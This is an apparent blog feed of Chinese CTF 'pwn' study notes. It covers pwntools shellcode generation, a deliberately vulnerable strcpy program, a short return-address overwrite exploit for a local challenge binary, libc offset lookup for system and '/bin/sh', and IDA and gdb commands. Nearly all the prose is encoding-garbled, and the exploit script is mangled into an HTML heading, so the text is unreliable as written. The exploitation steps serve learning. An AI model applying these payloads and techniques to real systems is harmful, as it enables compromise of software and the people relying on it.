æŸ¥æ‰¾ä½ç½®ä¹Ÿå¯ä»¥ä½¿ç”¨å­—ç¬¦ä¸²å»å®šä½<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><br>æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨æ ˆæº¢å‡ºçš„æ—¶å€™ï¼Œé¦–å…ˆæ„é€ <code>cyclic(0x100)</code>ï¼Œæˆ–è€…æ›´é•¿é•¿åº¦çš„patternï¼Œè¿›è¡Œè¾“å…¥ï¼Œè¾“å…¥åpcçš„å€¼å˜å‘³äº†0x61616161ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡<code>cyclic_find(0x61616161)</code>å°±å¯ä»¥å¾—åˆ°ä»å“ªä¸€ä¸ªå­—èŠ‚å¼€å§‹ä¼šæ§åˆ¶PCå¯„å­˜å™¨äº†ï¼Œé¿å…äº†å¾ˆå¤šæ²¡å¿…è¦çš„è®¡ç®—ã€‚</p><h1 id="æ±‡ç¼–ä¸shellcode"><a href="#æ±‡ç¼–ä¸shellcode" class="headerlink" title="æ±‡ç¼–ä¸shellcode"></a>æ±‡ç¼–ä¸shellcode</h1><p>æœ‰çš„æ—¶å€™æˆ‘ä»¬éœ€è¦åœ¨å†™expçš„æ—¶å€™ç”¨åˆ°ç®€å•çš„shellcodeï¼Œpwntoolsæä¾›äº†å¯¹ç®€å•çš„shellcodeçš„æ”¯æŒã€‚<br>é¦–å…ˆï¼Œå¸¸ç”¨çš„ï¼Œä¹Ÿæ˜¯æœ€ç®€å•çš„shellcodeã€‚shellcraft : shellcodeçš„ç”Ÿæˆå™¨ã€‚å³è°ƒç”¨<code>/bin/sh</code>å¯ä»¥é€šè¿‡shellcraftå¾—åˆ°ï¼š<br>æ³¨æ„ï¼Œç”±äºå„ä¸ªå¹³å°ï¼Œç‰¹åˆ«æ˜¯32ä½å’Œ64ä½çš„shellcodeä¸ä¸€æ ·ï¼Œæ‰€ä»¥æœ€å¥½å…ˆè®¾ç½®contextï¼Œå¦‚æœæ²¡å£°æ˜å¹³åˆ™<br><code>32ä½:shellcraft.i386.linux.sh()</code><br><code>64ä½:shellcraft.amd64.linux.sh()</code><br><pre class="line-numbers language-python" data-language="python"><code class="language-python">print(shellcraft.sh()) # æ‰“å°å‡ºshellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>ä¸è¿‡ï¼Œç°åœ¨æˆ‘ä»¬çœ‹åˆ°çš„shellcodeè¿˜æ˜¯æ±‡ç¼–ä»£ç ï¼Œä¸æ˜¯èƒ½ç”¨çš„æœºå™¨ç ï¼Œæ‰€ä»¥è¿˜éœ€è¦è¿›è¡Œä¸€æ¬¡æ±‡ç¼–<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">print(asm(shellcraft.sh())) # æ‰“å°å‡ºæ±‡ç¼–åçš„shellcode<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><br>asmå¯ä»¥å¯¹æ±‡ç¼–ä»£ç è¿›è¡Œæ±‡ç¼–ï¼Œä¸è¿‡pwntoolsç›®å‰çš„asmå®ç°è¿˜æœ‰ä¸€äº›ç¼ºé™·ï¼Œæ¯”å¦‚ä¸èƒ½æ”¯æŒç›¸å¯¹è·³è½¬ç­‰ç­‰ï¼Œåªå¯ä»¥è¿›è¡Œç®€å•çš„æ±‡ç¼–æ“ä½œã€‚å¦‚æœéœ€è¦æ›´å¤æ‚ä¸€äº›çš„æ±‡ç¼–åŠŸèƒ½ï¼Œå¯ä»¥ä½¿ç”¨<code>keystone-engine</code>é¡¹ç›®ï¼Œè¿™é‡Œå°±ä¸å†èµ˜è¿°äº†ã€‚<br>asmä¹Ÿæ˜¯æ¶æ„ç›¸å…³ï¼Œæ‰€ä»¥ä¸€å®šè¦å…ˆè®¾ç½®contextï¼Œé¿å…ä¸€äº›æ„æƒ³ä¸åˆ°çš„é”™è¯¯ã€‚</p><h1 id="ELFæ–‡ä»¶æ“ä½œ"><a href="#ELFæ–‡ä»¶æ“ä½œ" class="headerlink" title="ELFæ–‡ä»¶æ“ä½œ"></a>ELFæ–‡ä»¶æ“ä½œ</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python">In [1]: from pwn import*In [2]: elf &#x3D; ELF(&#39;.&#x2F;level0&#39;)[*] &#39;&#x2F;home&#x2F;nuo&#x2F;level0&#39;    Arch:     amd64-64-little    RELRO:    No RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)In [3]: callsys_addr &#x3D; elf.symbols[&#39;callsystem&#39;]In [4]: print callsys_addr4195734In [6]: a&#x3D;hex(callsys_addr)In [7]: print a0x400596<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯è§ipythonæ—¶ï¼ŒELFç›¸å½“äºchecksec ,ä½†å…¶ä¸»è¦æ˜¯è·å–ä¿¡æ¯ï¼Œä¸€äº›åœ°å€ç­‰<br><pre class="line-numbers language-python" data-language="python"><code class="language-python">&gt;&gt;&gt; e &#x3D; ELF(&#39;&#x2F;bin&#x2F;cat&#39;)&gt;&gt;&gt; print hex(e.address)  # æ–‡ä»¶è£…è½½çš„åŸºåœ°å€0x400000&gt;&gt;&gt; print hex(e.symbols[&#39;write&#39;]) # å‡½æ•°åœ°å€,symbols,got,pltå‡æ˜¯åˆ—è¡¨0x401680&gt;&gt;&gt; print hex(e.got[&#39;write&#39;]) # GOTè¡¨çš„åœ°å€0x60b070&gt;&gt;&gt; print hex(e.plt[&#39;write&#39;]) # PLTçš„åœ°å€0x401680&gt;&gt;&gt; print hex(e.search(&#39;&#x2F;bin&#x2F;sh&#39;).next())# å­—ç¬¦ä¸²&#x2F;bin&#x2F;shçš„åœ°å€å­—ç¬¦ä¸²åŠ ï¼ˆï¼‰<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWNå…¥é—¨-æ ˆæº¢å‡º</title>
      <link href="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
      <url>/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰"><a href="#ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰"></a>ç¼“å†²åŒºæº¢å‡ºä¹‹æ ˆæº¢å‡ºï¼ˆstrcpyï¼‰</h1><h2 id="é¢„å¤‡çŸ¥è¯†"><a href="#é¢„å¤‡çŸ¥è¯†" class="headerlink" title="é¢„å¤‡çŸ¥è¯†"></a>é¢„å¤‡çŸ¥è¯†</h2><h3 id="ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»"><a href="#ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»"></a>ç¼“å†²åŒºæº¢å‡ºç®€å•ä»‹ç»</h3><p>ç¼“å†²åŒºæº¢å‡ºï¼šç®€å•çš„è¯´ï¼Œç¼“å†²åŒºæº¢å‡ºå°±æ˜¯è¶…é•¿çš„æ•°æ®å‘å°ç¼“å†²åŒºå¤åˆ¶ï¼Œå¯¼è‡´æ•°æ®è¶…å‡ºäº†å°ç¼“å†²åŒºï¼Œå¯¼è‡´ç¼“å†²åŒºå…¶ä»–çš„æ•°æ®é­åˆ°ç ´åï¼Œè¿™å°±æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚<em>è€Œæ ˆæº¢å‡ºæ˜¯ç¼“å†²åŒºæº¢å‡ºçš„ä¸€ç§</em>ï¼Œä¹Ÿæ˜¯æœ€å¸¸è§çš„ã€‚åªä¸è¿‡æ ˆæº¢å‡ºå‘ç”Ÿåœ¨æ ˆï¼Œå †æº¢å‡ºå‘ç”Ÿåœ¨å †ï¼Œå…¶å®éƒ½æ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="æ ˆçš„ç®€å•ä»‹ç»"><a href="#æ ˆçš„ç®€å•ä»‹ç»" class="headerlink" title="æ ˆçš„ç®€å•ä»‹ç»"></a>æ ˆçš„ç®€å•ä»‹ç»</h3><p>æ ˆæ˜¯ä¸€ç§è®¡ç®—æœºç³»ç»Ÿä¸­çš„æ•°æ®ç»“æ„ï¼Œå®ƒæŒ‰ç…§å…ˆè¿›åå‡ºçš„åŸåˆ™å­˜å‚¨æ•°æ®ï¼Œå…ˆè¿›å…¥çš„æ•°æ®è¢«å‹å…¥æ ˆåº•ï¼Œæœ€åçš„æ•°æ®åœ¨æ ˆé¡¶ï¼Œéœ€è¦è¯»æ•°æ®çš„æ—¶å€™ä»æ ˆé¡¶å¼€å§‹å¼¹å‡ºæ•°æ®ï¼ˆæœ€åä¸€ä¸ªæ•°æ®è¢«ç¬¬ä¸€ä¸ªè¯»å‡ºæ¥ï¼‰ï¼Œæ˜¯ä¸€ç§ç‰¹æ®Šçš„çº¿æ€§è¡¨ã€‚æ ˆçš„æ“ä½œå¸¸ç”¨çš„æœ‰è¿›æ ˆï¼ˆPUSHï¼‰ï¼Œå‡ºæ ˆï¼ˆPOPï¼‰ï¼Œè¿˜æœ‰å¸¸ç”¨çš„æ ‡è¯†æ ˆé¡¶å’Œæ ˆåº•ã€‚</p><ul><li><strong>è¿›æ ˆ</strong>ï¼ˆPUSHï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®æ”¾å…¥æ ˆé‡Œå«è¿›æ ˆï¼ˆPUSHï¼‰</li><li><strong>å‡ºæ ˆ</strong>ï¼ˆPOPï¼‰ï¼šå°†ä¸€ä¸ªæ•°æ®ä»æ ˆé‡Œå–å‡ºå«å‡ºæ ˆï¼ˆPOPï¼‰</li><li><strong>æ ˆé¡¶</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨ESPï¼ŒESPæ˜¯æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„æ ˆé¡¶ã€‚</li><li><strong>æ ˆåº•</strong>ï¼šå¸¸ç”¨å¯„å­˜å™¨EBPï¼ŒEBPæ˜¯åŸºå€æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå…¶å†…å­˜æ”¾ç€ä¸€ä¸ªæŒ‡é’ˆï¼Œè¯¥æŒ‡é’ˆæ°¸è¿œæŒ‡å‘ç³»ç»Ÿæ ˆæœ€ä¸Šé¢ä¸€ä¸ªæ ˆå¸§çš„åº•éƒ¨ã€‚<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121143258.png" alt="Pasted image 20250121143258"><h2 id="å®ä¾‹åˆ†æ"><a href="#å®ä¾‹åˆ†æ" class="headerlink" title="å®ä¾‹åˆ†æ"></a>å®ä¾‹åˆ†æ</h2><h4 id="xxxxxxxxxx8-1from-pwn-import-2p-process-â€œ-IntOverflowâ€-3p-sendlineafter-â€œchoice-â€-â€1â€-4p-sendlineafter-â€œusername-nâ€-â€zechariahâ€-5cat-flag-addr-0x080486946payload-bâ€Aâ€-0x18-p32-cat-flag-addr-bâ€Aâ€-2347p-sendlineafter-â€œpasswd-nâ€-payload-8print-p-recvall-python"><a href="#xxxxxxxxxx8-1from-pwn-import-2p-process-â€œ-IntOverflowâ€-3p-sendlineafter-â€œchoice-â€-â€1â€-4p-sendlineafter-â€œusername-nâ€-â€zechariahâ€-5cat-flag-addr-0x080486946payload-bâ€Aâ€-0x18-p32-cat-flag-addr-bâ€Aâ€-2347p-sendlineafter-â€œpasswd-nâ€-payload-8print-p-recvall-python" class="headerlink" title="xxxxxxxxxx8 1from pwn import 2p=process(â€œ./IntOverflowâ€)  3p.sendlineafter(â€œchoice:â€,â€1â€)4p.sendlineafter(â€œusername:\nâ€,â€zechariahâ€)5cat_flag_addr = 0x080486946payload = bâ€Aâ€  0x18  + p32(cat_flag_addr) + bâ€Aâ€ * 2347p.sendlineafter(â€œpasswd:\nâ€,payload)8print (p.recvall())python"></a>xxxxxxxxxx8 1from pwn import <em>2p=process(â€œ./IntOverflowâ€)  3p.sendlineafter(â€œchoice:â€,â€1â€)4p.sendlineafter(â€œusername:\nâ€,â€zechariahâ€)5cat_flag_addr = 0x080486946payload = bâ€Aâ€ </em> 0x18  + p32(cat_flag_addr) + bâ€Aâ€ * 2347p.sendlineafter(â€œpasswd:\nâ€,payload)8print (p.recvall())python</h4><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include&lt;stdio.h&gt;#include&lt;string.h&gt;#define PASSWORD &quot;12345&quot;int test(char *password)&#123;    int ret_num;    char buffer[8];    ret_num&#x3D;strcmp(password,PASSWORD);&#x2F;&#x2F;ç›¸åŒè¿”å›0    strcpy(buffer,password);    return ret_num;&#125;int main()&#123;    int flag&#x3D;0;    char password[88];    while (1)&#123;        printf(&quot;plz input your password:\n&quot;);        scanf(&quot;%s&quot;,password);        flag&#x3D;test(password);        if(flag)&#123;            printf(&quot;incorrect password!\n\n&quot;);        &#125;        else&#123;             printf(&quot;Success!You are right!\n&quot;);        &#125;    &#125;    return 0;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="åˆ†æexeæ–‡ä»¶"><a href="#åˆ†æexeæ–‡ä»¶" class="headerlink" title="åˆ†æexeæ–‡ä»¶"></a>åˆ†æexeæ–‡ä»¶</h4>æœç´¢å­—ç¬¦ä¸²<code>plz input your password</code>,å¹¶åœ¨scanfå¤„ä¸‹æ–­ç‚¹<br><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121150226.png" alt="Pasted image 20250121150226"></li></ul><p><img src="/2025/02/03/PWN%E5%85%A5%E9%97%A8-%E6%A0%88%E6%BA%A2%E5%87%BA/Pasted image 20250121151019.png" alt="Pasted image 20250121151019"><br><em>0C-04=8ä¸ªå­—èŠ‚</em></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ ˆ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·libc-database</title>
      <link href="/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/"/>
      <url>/2025/02/03/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7libc-database/</url>
      
        <content type="html"><![CDATA[<p><a href="https://libc.rip/">libc-databaseåœ¨çº¿ç½‘å€</a></p><p>è¿è¡Œå¦‚ä¸‹å‘½ä»¤ä¸‹è½½libcç¬¦å·è¡¨ä¸åç§»æ–‡ä»¶ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;get  # List categories$ .&#x2F;get ubuntu debian  # Download Ubuntu&#39;s and Debian&#39;s libc, old default behavior$ .&#x2F;get all  # Download all categories. Can take a while!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p><p>å°†è‡ªå®šä¹‰çš„ libc æ·»åŠ åˆ°ä½ çš„æ•°æ®åº“ä¸­ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;add &#x2F;usr&#x2F;lib&#x2F;libc-2.21.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p><p>åœ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾æ‰€æœ‰å…·æœ‰ç»™å®šåç§°å’Œåœ°å€çš„ libcã€‚åªæ£€æŸ¥æœ€å 12 ä½ï¼Œå› ä¸ºéšæœºåŒ–é€šå¸¸åœ¨é¡µé¢å¤§å°çº§åˆ«ä¸Šå·¥ä½œã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;find printf 260 puts f30archive-glibc (libc6_2.19-10ubuntu2_i386)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>ä»æ³„æ¼çš„è¿”å›åœ°å€ä¸­æŸ¥æ‰¾ libc<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;find __libc_start_main_ret a83ubuntu-trusty-i386-libc6 (libc6_2.19-0ubuntu6.6_i386)archive-eglibc (libc6_2.19-0ubuntu6_i386)ubuntu-utopic-i386-libc6 (libc6_2.19-10ubuntu2.3_i386)archive-glibc (libc6_2.19-10ubuntu2_i386)archive-glibc (libc6_2.19-15ubuntu2_i386)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>æ ¹æ® libc ID æå–ä¸€äº›æœ‰ç”¨çš„åç§»é‡<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;dump libc6_2.19-0ubuntu6.6_i386offset___libc_start_main_ret &#x3D; 0x19a83offset_system &#x3D; 0x00040190offset_dup2 &#x3D; 0x000db590offset_recv &#x3D; 0x000ed2d0offset_str_bin_sh &#x3D; 0x160a24<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>æ£€æŸ¥ä¸€ä¸ªåº“æ˜¯å¦å·²ç»åœ¨æ•°æ®åº“ä¸­ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;identify &#x2F;usr&#x2F;lib&#x2F;libc.so.6local-f706181f06104ef6c7008c066290ea47aa4a82c5<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p><p>æˆ–è€…ä½¿ç”¨å“ˆå¸Œå€¼ï¼ˆç›®å‰å®ç°äº† BuildIDã€MD5ã€SHA1 å’Œ SHA256ï¼‰æŸ¥æ‰¾ libcï¼š<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;identify bid&#x3D;ebeabf5f7039f53748e996fc976b4da2d486a626libc6_2.17-93ubuntu4_i386$ .&#x2F;identify md5&#x3D;af7c40da33c685d67cdb166bd6ab7ac0libc6_2.17-93ubuntu4_i386$ .&#x2F;identify sha1&#x3D;9054f5cb7969056b6816b1e2572f2506370940c4libc6_2.17-93ubuntu4_i386$ .&#x2F;identify sha256&#x3D;8dc102c06c50512d1e5142ce93a6faf4ec8b6f5d9e33d2e1b45311aef683d9b2libc6_2.17-93ubuntu4_i386<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p><p>ä¸‹è½½ä¸ libc ID å¯¹åº”çš„æ•´ä¸ªåº“ã€‚<br><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ .&#x2F;download libc6_2.23-0ubuntu10_amd64Getting libc6_2.23-0ubuntu10_amd64    -&gt; Location: http:&#x2F;&#x2F;security.ubuntu.com&#x2F;ubuntu&#x2F;pool&#x2F;main&#x2F;g&#x2F;glibc&#x2F;libc6_2.23-0ubuntu10_amd64.deb    -&gt; Downloading package    -&gt; Extracting package    -&gt; Package saved to libs&#x2F;libc6_2.23-0ubuntu10_amd64$ ls libs&#x2F;libc6_2.23-0ubuntu10_amd64ld-2.23.so ... libc.so.6 ... libpthread.so.0 ...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·IDA_Pro</title>
      <link href="/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/"/>
      <url>/2025/02/02/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7IDA-Pro/</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>ç¬”è€…æ›¾ç»ç”¨è¿‡ <code>7.7ï¼ˆç»§æ‰¿äº†æ¥è‡ªå­¦é•¿55æ¡‘çš„è¯¸å¤šæ’ä»¶ï¼‰</code> ä¸ <code>8.3</code>ï¼Œä½†éƒ½åªæ˜¯è‰è‰ç”¨è¿‡ï¼Œè¿‘æ—¥æ²‰è¿·äºpwnä¹‹ä¹è¶£ï¼Œä½¿ç”¨é¢‘ç‡å¤§å¤§å¢åŠ ï¼Œæ°å·§è‡ªå·±æ–°æäº†å…¨æ–°æ¬¾<code>IDA Pro 9.0 SP1</code>)ï¼Œæ·±å…¥äº†è§£åä¹Ÿè¢«IDAçš„å¼ºå¤§åŠŸèƒ½æŠ˜æœã€‚<br>é‚ä»é›¶å¼€å§‹è®°å½•<strong>ä½¿ç”¨ç¬”è®°</strong></p><h2 id="å¸¸ç”¨å¿«æ·é”®"><a href="#å¸¸ç”¨å¿«æ·é”®" class="headerlink" title="å¸¸ç”¨å¿«æ·é”®"></a>å¸¸ç”¨å¿«æ·é”®</h2><p><code>f5</code>ï¼šæ˜¾ç¤ºä¼ªcä»£ç ï¼Œå› ä¸ºä»–ä¼šç”¨ä¸€äº›è‡ªå·±çš„ç¬¦å·æ¥æ ‡è®°ä¸€äº›ä¸œè¥¿ï¼Œè¿™ä¸ªæ‰“å¼€ä¸€ä¸ªå«ders.hçš„æ–‡ä»¶å°±èƒ½çœ‹è§ï¼Œä¸è¿‡ä¸å½±å“æˆ‘ä»¬å¤§è‡´ç†è§£è¿™ä¸ªç¨‹åº<br><code>x</code>:æŸ¥çœ‹ç¬¦å·çš„å¼•ç”¨ï¼Œé€‰ä¸­ä¸€ä¸ªç¬¦å·åæŒ‰xå¯ä»¥æ˜¾ç¤ºå“ªé‡Œå¼•ç”¨äº†x<br><code>options-&gt;General-&gt;Disassembly-&gt;Line Prefixes</code>:å¯ä»¥åœ¨åæ±‡ç¼–çª—å£æ˜¾ç¤ºä»£ç çš„åœ°å€,æ–¹ä¾¿ä½¿ç”¨gdbç›´æ¥åœ¨æŸä¸ªå†…å­˜åœ°å€ä¸‹æ–­ç‚¹<br><code>shift + f12</code>æ˜¾ç¤ºå­—ç¬¦ä¸²çª—å£:å¯ä»¥æ–¹ä¾¿åœ°å®šä½å…³é”®ä»£ç çš„ä½ç½®<br><code>shift + f7</code> æ˜¾ç¤ºæ®µçª—å£<br><code>n</code>:é‡å‘½åç¬¦å·:å¯ä»¥ç”¨ä¸€ä¸ªæ›´ç›´è§‚çš„åå­—å‘½åç¬¦å·ï¼Œæ–¹ä¾¿è‡ªå·±ç†è§£ä»£ç <br><code>x</code>ï¼šæ‰§è¡Œäº¤å‰å¼•ç”¨ï¼Œå¯ä»¥æŸ¥çœ‹ç¨‹åºå“ªä¸ªåœ°æ–¹è°ƒç”¨äº†è¯¥å‡½æ•°</p><p><code>alt + T</code>:æœç´¢æŒ‡ä»¤åœ°å€</p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·gdb</title>
      <link href="/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/"/>
      <url>/2025/02/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7gdb/</url>
      
        <content type="html"><![CDATA[<p><a href="https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html"> 100ä¸ªgdbå°æŠ€å·§</a></p><p><code>start</code>:ç¨‹åºè‡ªåŠ¨ä¸­æ–­åœ¨mainå‡½æ•°å¤„<br><code>c</code>:ç»§ç»­è¿è¡Œ</p><p><code>b main</code>:mainå¤„ä¸‹æ–­ç‚¹<br><code>r/run</code>:è¿è¡Œç¨‹åºï¼Œé‡åˆ°æ–­ç‚¹åœä¸‹<br><code>vmmap</code>:æŸ¥çœ‹å†…å­˜æ˜ å°„ï¼Œå„åŠ è½½æ–‡ä»¶çš„åŠ è½½åœ°å€ä¿¡æ¯</p><p><code>-q</code>:å‚æ•°ä¸æ˜¾ç¤ºæ¬¢è¿ä¿¡æ¯ç­‰<br><code>-n</code>:ä¸åŠ è½½ä»»ä½•æ’ä»¶ï¼Œä½¿ç”¨åŸç”Ÿ gdb<br><code>info</code>:åé¢è·Ÿä¸Šæƒ³è¦æŸ¥çœ‹çš„ä¿¡æ¯ï¼Œå¦‚å‡½æ•°ä¿¡æ¯ info functions</p><p><code>b/breakpoint</code>:è®¾ç½®æ–­ç‚¹<br><code>del/delete breakpoints n</code>:åˆ é™¤æ–­ç‚¹ï¼Œnæ˜¯æ–­ç‚¹ç¼–å·ï¼Œå¯ç”¨info breakpointså‘½ä»¤æŸ¥çœ‹æ–­ç‚¹ä¿¡æ¯</p><p><code>start</code>å‘½ä»¤å¯åŠ¨ç¨‹åºå¹¶åœåœ¨å¼€è¾Ÿå®Œä¸»å‡½æ•°æ ˆå¸§çš„åœ°æ–¹<br><code>c/continue</code>:ç»§ç»­æ‰§è¡Œç¨‹åºï¼Œé‡åˆ°æ–­ç‚¹åœä¸‹<br><code>f/finish</code>:ç»“æŸç¨‹åº</p><p><code>ni</code>:å•æ­¥æ­¥è¿‡ï¼Œä¸€æ­¥ä¸€æ­¥æ‰§è¡ŒæŒ‡ä»¤é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶ç›´æ¥æ‰§è¡Œå®Œæ•´ä¸ªå‡½æ•°<br><code>si</code>:å•æ­¥æ­¥å…¥ï¼Œä¸€æ­¥ä¸€æ­¥æ‰§è¡ŒæŒ‡ä»¤é‡åˆ°å‡½æ•°è°ƒç”¨æ—¶è·³è½¬åˆ°å‡½æ•°å†…éƒ¨</p><p><code>checksec</code>:æŸ¥çœ‹ç¨‹åºçš„é˜²æŠ¤æªæ–½</p><p><code>pdisass/disassemble</code>:æŸ¥çœ‹å½“å‰å‡½æ•°å¸§çš„åæ±‡ç¼–ä»£ç ï¼Œå‰ä¸€ä¸ªå‘½ä»¤æœ‰é«˜äº®æ˜¾ç¤ºåªæ˜¯éœ€è¦å®‰è£…pwndbgæ’ä»¶ï¼Œåé¢ä¸€ä¸ªå‘½ä»¤æ—¶gdbè‡ªå¸¦çš„å‘½ä»¤æ— é«˜äº®æ˜¾ç¤º</p><p><code>p/print</code>:æ‰“å°ä¿¡æ¯ï¼Œå¦‚å¯„å­˜å™¨ p $ebp<br><code>p &amp; __libc_argv[0]</code>:å¯ä»¥å¾—åˆ°argv[0]çš„åœ°å€</p><p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code>:æŸ¥çœ‹æŸåœ°å€å¤„çš„å€¼ï¼Œn/f/u å‚æ•°ä¸ºå¯é€‰ï¼Œnä»£è¡¨æƒ³è¦æŸ¥çœ‹å¤šå°‘ä¸ªå†…å­˜å•å…ƒå³ä»å½“å‰åœ°å€å¼€å§‹è®¡ç®—ï¼Œæ¯ä¸ªå†…å­˜å•å…ƒçš„å¤§å°ç”±åé¢çš„uå‚æ•°æŒ‡å®šï¼›fè¡¨ç¤ºæ˜¾ç¤ºæ ¼å¼ï¼Œå¦‚sè¡¨ç¤ºå­—ç¬¦ä¸²å½¢å¼ï¼Œiä¸ºæŒ‡ä»¤å½¢å¼ï¼›uæŒ‡å®šå†…å­˜å•å…ƒå¤§å°ï¼Œb(ä¸€ä¸ªå­—èŠ‚)ã€h(åŒå­—èŠ‚)ã€w(å››ä¸ªå­—èŠ‚)ã€g(å…«å­—èŠ‚)é»˜è®¤ä¸ºwï¼› åé¢è·Ÿä¸Šxä»£è¡¨ä»¥åå…­è¿›åˆ¶çš„å½¢å¼æŸ¥çœ‹å˜é‡</p><p><code>set *addr = value</code>:è®¾ç½®æŸä¸ªåœ°å€çš„å€¼</p>]]></content>
      
      
      <categories>
          
          <category> è§£é¢˜å·¥å…· </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> è§£é¢˜å·¥å…· </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å…·ç¯‡Â·å…¶ä½™å·¥å…·(å¾…å¡«å‘)</title>
      <link href="/2025/01/01/%E5%B7%A5%E5%85%B7%E7%AF%87%C2%B7%E5%85%B6%E4%BD%99%E5%B7%A5%E5%85%B7-%E5%BE%85%E5%A1%AB%E5%9D%91/"/>
